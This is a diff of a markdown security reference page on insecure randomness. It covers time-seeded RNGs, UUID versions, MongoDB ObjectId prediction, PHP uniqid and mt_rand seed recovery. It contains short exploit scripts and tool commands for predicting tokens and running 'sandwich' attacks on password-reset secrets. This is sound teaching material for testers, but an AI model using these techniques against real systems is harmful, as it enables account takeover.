@@ -1,13 +1,53 @@
 # Insecure Randomness
 
+> Insecure randomness refers to the weaknesses associated with random number generation in computing, particularly when such randomness is used for security-critical purposes. Vulnerabilities in random number generators (RNGs) can lead to predictable outputs that can be exploited by attackers, resulting in potential data breaches or unauthorized access. 
+
+
 ## Summary
 
+* [Methodology](#methodology)
+* [Time-Based Seeds](#time-based-seeds)
 * [GUID / UUID](#guid--uuid)
     * [GUID Versions](#guid-versions)
 * [Mongo ObjectId](#mongo-objectid)
 * [Uniqid](#uniqid)
-* [Other](#other)
+* [mt_rand](#mt_rand)
+* [Custom Algorithms](#custom-algorithms)
 * [References](#references)
+
+
+## Methodology
+
+Insecure randomness arises when the source of randomness or the method of generating random values is not sufficiently unpredictable. This can lead to predictable outputs, which can be exploited by attackers. Below, we examine common methods that are prone to insecure randomness, including time-based seeds, GUIDs, UUIDs, MongoDB ObjectIds, and the `uniqid()` function.
+
+
+## Time-Based Seeds
+
+Many random number generators (RNGs) use the current system time (e.g., milliseconds since epoch) as a seed. This approach can be insecure because the seed value can be easily predicted, especially in automated or scripted environments.
+
+```py
+import random
+import time
+
+seed = int(time.time())
+random.seed(seed)
+print(random.randint(1, 100))
+```
+
+The RNG is seeded with the current time, making it predictable for anyone who knows or can estimate the seed value.
+By knowing the exact time, an attacker can regenerate the correct random value, here is an example for the date `2024-11-10 13:37`.
+
+```python
+import random
+import time
+
+# Seed based on the provided timestamp
+seed = int(time.mktime(time.strptime('2024-11-10 13:37', '%Y-%m-%d %H:%M')))
+random.seed(seed)
+
+# Generate the random number
+print(random.randint(1, 100))
+```
 
 
 ## GUID / UUID
@@ -24,7 +64,7 @@ The four-bit M and the 1- to 3-bit N fields code the format of the UUID itself.
 |----------|--------|
 | 0 | Only `00000000-0000-0000-0000-000000000000` |
 | 1 | based on time, or clock sequence |
-| 2 | reserved in the RFC 4122, but ommitted in many implementations |
+| 2 | reserved in the RFC 4122, but omitted in many implementations |
 | 3 | based on a MD5 hash |
 | 4 | randomly generated |
 | 5 | based on a SHA1 hash |
@@ -49,6 +89,7 @@ The four-bit M and the 1- to 3-bit N fields code the format of the UUID itself.
 ## Mongo ObjectId
 
 Mongo ObjectIds are generated in a predictable manner, the 12-byte ObjectId value consists of: 
+
 * **Timestamp** (4 bytes): Represents the ObjectId’s creation time, measured in seconds since the Unix epoch (January 1, 1970).
 * **Machine Identifier** (3 bytes): Identifies the machine on which the ObjectId was generated. Typically derived from the machine's hostname or IP address, making it predictable for documents created on the same machine.
 * **Process ID** (2 bytes): Identifies the process that generated the ObjectId. Typically the process ID of the MongoDB server process, making it predictable for documents created by the same process.
@@ -71,7 +112,7 @@ Token example
 * Python script to recover the `timestamp`, `process` and `counter`
     ```py
     def MongoDB_ObjectID(timestamp, process, counter):
-        return "%08x%08x%06x" % (
+        return "%08x%10x%06x" % (
             timestamp,
             process,
             counter,
@@ -79,10 +120,14 @@ Token example
 
     def reverse_MongoDB_ObjectID(token):
         timestamp = int(token[0:8], 16)
-        process = int(token[8:16], 16)
-        counter = int(token[16:], 16)
+        process = int(token[8:18], 16)
+        counter = int(token[18:24], 16)
         return timestamp, process, counter
 
+
+    def check(token):
+        (timestamp, process, counter) = reverse_MongoDB_ObjectID(token)
+        return token == MongoDB_ObjectID(timestamp, process, counter)
 
     tokens = ["5ae9b90a2c144b9def01ec37", "5ae9bac82c144b9def01ec39"]
     for token in tokens:
@@ -128,27 +173,46 @@ for token in tokens:
 ```
 
 
-## Other
+## mt_rand
 
-Other bad ideas that are sometimes shipped into production.
+Breaking mt_rand() with two output values and no bruteforce.
+
+* [ambionics/mt_rand-reverse](https://github.com/ambionics/mt_rand-reverse) - Script to recover mt_rand()'s seed with only two outputs and without any bruteforce.
+
+```ps1
+./display_mt_rand.php 12345678 123
+712530069 674417379
+
+./reverse_mt_rand.py 712530069 674417379 123 1
+```
+
+
+## Custom Algorithms
+
+Creating your own randomness algorithm is generally not recommended. Below are some examples found on GitHub or StackOverflow that are sometimes used in production, but may not be reliable or secure.
 
 * `$token = md5($emailId).rand(10,9999);`
 * `$token = md5(time()+123456789 % rand(4000, 55000000));`
 
+
+
+### Tools
+
 Generic identification and sandwitch attack: 
 
-* [AethliosIK/reset-tolkien](https://github.com/AethliosIK/reset-tolkien) - Unsecure time-based secret exploitation and Sandwich attack implementation Resources
+* [AethliosIK/reset-tolkien](https://github.com/AethliosIK/reset-tolkien) - Insecure time-based secret exploitation and Sandwich attack implementation Resources
     ```ps1
     reset-tolkien detect 660430516ffcf -d "Wed, 27 Mar 2024 14:42:25 GMT" --prefixes "attacker@example.com" --suffixes "attacker@example.com" --timezone "-7"
     reset-tolkien sandwich 660430516ffcf -bt 1711550546.485597 -et 1711550546.505134 -o output.txt --token-format="uniqid"
     ``` 
 
 
-### References
+## References
 
-* [In GUID We Trust - Daniel Thatcher - October 11, 2022](https://www.intruder.io/research/in-guid-we-trust)
-* [IDOR through MongoDB Object IDs Prediction - Amey Anekar - August 25, 2020](https://techkranti.com/idor-through-mongodb-object-ids-prediction/)
-* [[FR] Secret basé sur le temps non sécurisé et attaque par sandwich - Analyse de mes recherches et publication de l’outil “Reset Tolkien” - Tom CHAMBARETAUD / @AethliosIK - 2 apr 2024](https://www.aeth.cc/public/Article-Reset-Tolkien/secret-time-based-article-fr.html)
-* [[EN] Unsecure time-based secret and Sandwich Attack - Analysis of my research and release of the “Reset Tolkien” tool - Tom CHAMBARETAUD / @AethliosIK - 2 apr 2024](https://www.aeth.cc/public/Article-Reset-Tolkien/secret-time-based-article-en.html)
-* [Secret non sécurisé basé sur le temps et attaques par sandwich - Tom CHAMBARETAUD aka Aethlios](#)
-* [Exploiting Weak Pseudo-Random Number Generation in PHP’s rand and srand Functions - Jacob Moore - Oct 18, 2023](https://medium.com/@moorejacob2017/exploiting-weak-pseudo-random-number-generation-in-phps-rand-and-srand-functions-445229b83e01)
+- [In GUID We Trust - Daniel Thatcher - October 11, 2022](https://www.intruder.io/research/in-guid-we-trust)
+- [IDOR through MongoDB Object IDs Prediction - Amey Anekar - August 25, 2020](https://techkranti.com/idor-through-mongodb-object-ids-prediction/)
+- [Secret basé sur le temps non sécurisé et attaque par sandwich - Analyse de mes recherches et publication de l’outil “Reset Tolkien” - Tom CHAMBARETAUD (@AethliosIK) - April 2, 2024](https://www.aeth.cc/public/Article-Reset-Tolkien/secret-time-based-article-fr.html) *(FR)*
+- [Unsecure time-based secret and Sandwich Attack - Analysis of my research and release of the “Reset Tolkien” tool - Tom CHAMBARETAUD (@AethliosIK) - April 2, 2024](https://www.aeth.cc/public/Article-Reset-Tolkien/secret-time-based-article-en.html) *(EN)*
+- [Multi-sandwich attack with MongoDB Object ID or the scenario for real-time monitoring of web application invitations: a new use case for the sandwich attack - Tom CHAMBARETAUD (@AethliosIK) - July 18, 2024](https://www.aeth.cc/public/Article-Reset-Tolkien/multi-sandwich-article-en.html)
+- [Exploiting Weak Pseudo-Random Number Generation in PHP’s rand and srand Functions - Jacob Moore - October 18, 2023](https://medium.com/@moorejacob2017/exploiting-weak-pseudo-random-number-generation-in-phps-rand-and-srand-functions-445229b83e01)
+- [Breaking PHP's mt_rand() with 2 values and no bruteforce - Charles Fol - January 6, 2020](https://www.ambionics.io/blog/php-mt-rand-prediction)
